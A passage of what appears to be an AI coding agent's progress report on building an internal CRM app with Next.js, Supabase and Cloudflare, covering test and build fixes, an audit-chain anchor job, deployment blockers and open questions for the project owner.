2. **`tsc` was silently skipping `middleware.ts`** — root-level files matched none of the existing include globs, so it reported exit 0 while checking nothing. The agent caught this itself and flagged the fix as a scope deviation rather than making it quietly.
3. **M8's tests had never run.** It reported so plainly, and `0005_admin_guards.sql` had never been executed. Both now verified centrally: the migration applies and all 45 pre-existing schema tests still pass alongside it.

### The memory saga, finally understood — it was self-inflicted

`node_modules` sitting inside OneDrive was **a major cause of the test out-of-memory failures**, not just untidiness. Restoring the junction moved free commit charge from **0.57 GB to 2.75 GB**, and the entire 584-test suite then ran in a single pass for the first time.

**But the junction is incompatible with Next 16.** Both Turbopack (*"Symlink node_modules is invalid, it points out of the filesystem root"*) and the webpack fallback refuse it. So it had to be reverted: the build is the deliverable.

**The two constraints cannot both be satisfied while the project lives inside OneDrive.** The real fix is not a junction — it is moving the working tree out of OneDrive entirely, which also resolves the "wrong repository / nothing committed" problem above. One action fixes three things: create a company-owned repo, clone it to a non-OneDrive path, and work there.

### Still open, honestly

- **`lastLoginAt` is null for everyone.** Nothing writes a `LOGIN` access event. M8 suggested "one line in the auth path fixes it" — **it does not**, and I am not implementing it on that basis: Cloudflare Access owns the session, so there is no login boundary in this app to hook. Both admin pages already show last *activity* as an explicitly-labelled fallback, which is the honest answer until a real session boundary exists.
- **An admin can deactivate themselves**, and deactivating the last admin locks the firm out of the allow-list and the audit log. Not in M8's required rule set; recorded rather than silently added.
- **`middleware` is deprecated in Next 16** in favour of `proxy` (the warning appears on every build). Not renamed: changing a security-critical filter on a guess about a new API's contract is worse than a deprecation warning. Needs the docs read first.
- **A correction of my own:** I reported three routes 404-ing in a smoke test. That was wrong — my readiness probe only compiled `/tickets`, so I measured the others before Next had built them. On a warmed server all eleven return 200, and the content assertions I ran against those 404 bodies were meaningless. Re-run properly.

## The daily anchor job — DONE. 10 tests

`src/service/daily-anchor.ts`. It does two things, and only the second can catch anything: record today's head hash, and **verify the entire current chain against every anchor recorded on previous days**. Recording alone would just accumulate numbers nobody compares — the audit equivalent of taking backups and never restoring one.

Two guards worth naming:
- **The admin-actor trap.** `audit.list` returns nothing both when the log is genuinely empty *and* when the caller is not an admin. Anchoring the genesis hash in the second case would replace a real recorded head with a hash of nothing, and the file would then disagree with itself forever. The job refuses when the log reads empty but the anchors file says it should not be — and says a non-admin actor is the likely cause.
- **No silent suffix verification.** Exceeding `MAX_CHAIN_ROWS` is reported as a problem, never truncated, because verifying part of a chain proves nothing while looking exactly like success.

## Next 16 `middleware` → `proxy` — DONE, doc-verified

Migrated after reading the actual migration doc rather than guessing. It is a rename plus a function-name change; `config`/`matcher` is unchanged; the one behavioural difference (Proxy defaults to the Node.js runtime) is inert here because the file uses nothing runtime-specific. `tsconfig`'s explicit `"middleware.ts"` include was updated to `"proxy.ts"` — miss that and typechecking passes while checking nothing. Build is clean and the deprecation warning is gone.

## A design error of mine, caught before it shipped

I started adding access-event archival (`listUnarchived` / `markArchived` / `pruneArchived`) to the `AccessLog` port. It typechecked, and it would have passed against the in-memory store.

**It cannot work.** `0002_append_only.sql` revokes UPDATE and DELETE on `access_events` from `crm_app`, and every repository obtained via `withActor` runs as exactly that role. The methods would have failed in production with a permission error — and the in-memory implementation would have hidden that, because the contract test only proves the two agree, not that either is *possible*.

The real fault was putting it in the wrong layer: **archival is an owner-level maintenance operation, not something an employee does**, so it has no business on an actor-bound port. It needs either a `SECURITY DEFINER` function (the pattern `app.append_audit` already uses for precisely this reason) or a separate owner-level connection used only by the scheduled job. Both are coupled to the production adapter.

Reverted rather than shipped, with the reasoning left in `src/repo/types.ts` where the next person would otherwise repeat it. **The lesson generalises: a contract test proves two implementations agree, not that the operation is permitted.** Privileges are not part of that contract.

## M11 deployment attempt — 4 blockers cleared, 1 hard wall. 613 tests still pass

Principal chose to deploy. Production DB adapter built (`src/server/pg-client.ts`): `pg` over Supabase's **session-mode** pooler (port 5432), a client per request, and `assertSessionModeUrl` **refuses port 6543 at construction** — transaction-mode pooling silently discards `SET LOCAL ROLE`, which disables row-level security with no error at all. Plus `assertSessionIdentity` in `postgres.ts`: every transaction now proves `current_user = crm_app` and the identity GUC matches before running a single query. One extra round trip against silent total authorisation loss is not a close call.

**Four real blockers found by building, not by reasoning:**

1. **PGlite was being traced into the production bundle** — the whole WASM Postgres. Next follows dynamic imports, so merely *mentioning* it in `src/server/db.ts` pulled it in. The `CRM_DEV_STORE=pglite` mode is gone; PGlite lives in the test suite, which is where it belongs.
2. **`BigInt` crashed Next's file tracer** — `TypeError: Cannot mix BigInt and other types` inside `@vercel/nft`, which made the app impossible to package at all. `hash-chain.ts` now uses `number`. Safe: the hash serialises `String(seq)`, identical either way, so existing chains still verify. Nine quadrillion audit rows was never this tool's problem.
3. **The `proxy` rename had been silently reverted** by a later concurrent agent writing from a stale view of the file. My report that the deprecation warning was gone was therefore wrong. Caught by noticing the warning reappear in a build.
4. **Next 16 + Cloudflare cannot have middleware at all.** Verified from both tools: OpenNext says *"Node.js middleware is not currently supported"*; Next says *"Proxy always runs on Node.js runtime"*. Mutually exclusive, no configuration satisfies both. Removed — reasoning and the (better) replacement in `src/security/NO_MIDDLEWARE.md`. The per-employee limiter, which was always the meaningful control, is untouched.

### The hard wall: this laptop cannot build the deployment bundle

Measured, not inferred:

```
AllowDevelopmentWithoutDevLicense = not set   (Developer Mode OFF)
elevated admin                    = False
creating a symlink                → "Administrator privilege required"
```

`@opennextjs/cloudflare` symlinks traced dependencies. Enabling Developer Mode writes to HKLM and needs admin. **No code change can fix this**, and the same machine also ran out of commit charge mid-build repeatedly.

**So deployment now genuinely depends on the repository** — not for tidiness, but because the build has to happen on Linux CI. `deploy/github-actions-deploy.yml` is written and ready; it needs a repo to live in and two Cloudflare secrets.

### Still unresolved: whether hosting is free

I could not measure the compressed Worker size, because the build never completed. The research estimate stands at **$5/month** for Workers Paid (the free plan caps a Worker at 3 MiB compressed and 10 ms CPU per request). My earlier "no monthly cost" claim remains **unverified either way** — the first successful CI build will settle it.

## NEXT STEP (exact)

1. **A repo is now the blocker for deployment**, because the laptop cannot build. Move the tree out of OneDrive into a company-owned repo — this also fixes the sync memory drain and the succession risk.
2. **Rotate the exposed GitHub token** and re-point the remote at a token-free URL.
3. **M11**: production DB adapter, then the cron handler for anchor + encrypted backup + archival, then the four DESIGN §9 checks — **check 0 first**. Needs the Principal's Supabase and Cloudflare accounts.
4. **Restore drill** — a backup that has never been restored is not a backup.
3. **Principal reviews `REQUIREMENTS.md` + `DESIGN.md`** — the design decisions, not the code.
4. Run the pre-build checks in DESIGN §9 — **check 0 first** (SEBI registration set; it determines the CSCRF bucket):
   - Supabase free project can select **ap-south-1 Mumbai** — 3 min. Load-bearing for the whole residency story.
   - Zero Trust billing page → **actual free seat entitlement** — 2 min. Sources conflict 50 vs unlimited; overage *blocks* users.
   - Access OTP end-to-end on `*.pages.dev`, including that mail reaches an `@ionic.in` inbox and not Junk — 15 min.
   - `workers_dev = false` takes effect; `workers.dev` URL returns non-200 — 10 min.
4. Then scaffold, then schema-first.

## Open for Principal

| # | Question |
|---|---|
| 1 | Managers see all reports' tickets, or only those they personally assigned? |
| 2 | When to seek firm sanction |
| 3 | Accept cleartext punch notes for working search? (recommend: yes, V1) |
| 4 | Repo under a company GitHub account or personal? (recommend: company, first commit) |
| 5 | **Is the firm onboarded to SEBI's Market SOC?** Conditions every CSCRF exemption. Worth asking Compliance regardless of this project. |
| 6 | Is firm AUM ≤ ₹3,000 cr? Determines the RE bucket. |

## Research artefacts

Session scratchpad: `research-dpdp.md` · `research-sebi.md` · `research-github-db.md` · `research-infra.md` · `research-templates.md` · `research-features-security.md` · `research-excel-backend.md` · `research-lists-backend.md` (~460 KB total, full citations with fetch dates).
